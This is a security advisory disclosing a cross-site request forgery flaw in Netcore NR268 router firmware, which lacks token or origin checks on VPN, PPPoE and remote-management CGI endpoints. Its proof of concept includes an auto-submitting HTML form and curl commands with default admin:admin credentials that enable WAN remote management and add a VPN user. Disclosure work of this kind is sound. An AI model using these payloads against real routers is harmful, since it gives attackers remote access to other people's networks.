# Netcore NR268 Cross-Site Request Forgery on VPN and Remote-Access Write Endpoints

**Vendor:** Netcore  
**Product:** NR268 Router  
**Affected Version:** NR268-V1.7.121109.bin  
**Vulnerability Type:** Cross-Site Request Forgery (CWE-352)  
**Credits:** Zhou Ao, Yin Luxing, Jiang Yuxuan, Liu Xin, @Nebusec

## Summary

State-changing VPN, PPTP-client, PPPoE-account, and remote-management-port CGI handlers rely solely on HTTP Basic authentication and accept only business fields. The shared `DataRequest` helper and the module pages submit raw `$.post` or multipart requests with no nonce, token, or origin binding. A hostile page can enable WAN management, change VPN accounts, or import PPPoE accounts through the victim's browser.

## Technical Details

The HTTP boundary only checks Basic authentication before dispatching these CGI actions. Request bodies are parsed and consumed directly. The handlers do not validate Origin, Referer, or a CSRF token. Browsers automatically attach cached Basic-auth credentials, so a cross-site POST is executed with the administrator's authenticated context.

### Affected Endpoint

- URL: `/router/WebRemotePortSet.cgi`, `/router/pptpd_adduser_set.cgi`, `/router/pptpd_deluser_set.cgi`, `/router/pptpd_cleanuser_set.cgi`, `/router/pptpd_config_set.cgi`, `/router/pptp_client_add.cgi`, `/router/pptp_client_link.cgi`, `/router/pptp_client_down.cgi`, `/router/pptp_client_del.cgi`, `/router/pptp_client_clean.cgi`, `/router/pppoe_server_set.cgi`, `/router/pppoe_server_account_add.cgi`, `/router/pppoe_server_account_del.cgi`, `/router/pppoe_server_account_import.cgi`, `/router/pppoe_server_account_change_state.cgi`, `/router/pppoe_server_change_charge.cgi`
- Parameters: business fields only; no CSRF token
- Method: POST
- Authentication: victim browser sends cached HTTP Basic credentials

## Proof of Concept

```html
<html>
  <body onload="document.forms[0].submit()">
    <form method="POST" action="http://192.168.1.1/router/WebRemotePortSet.cgi">
      <input type="hidden" name="remotemE" value="1">
      <input type="hidden" name="remotemport" value="8088">
    </form>
  </body>
</html>
```

```bash
curl -s -u admin:admin -X POST "http://192.168.1.1/router/WebRemotePortSet.cgi" \
  -d "remotemE=1&remotemport=8088"

curl -s -u admin:admin -X POST "http://192.168.1.1/router/pptpd_adduser_set.cgi" \
  -d "name=csrfuser&password=csrfpass&remark=fwmodvpn002&route_nr=0&deal=add"
```

### Outcome

The router accepts the cross-site POST and applies the change. Enabling WAN-side remote management, adding a PPTP user, or importing PPPoE accounts does not require a CSRF token or Origin check.

## Impact

- **Confidentiality:** Medium
- **Integrity:** High – WAN remote management, VPN users, PPTP client state, and PPPoE accounts can be changed
- **Availability:** Medium

A victim administrator who visits a hostile page can be forced into privileged VPN and remote-access changes.
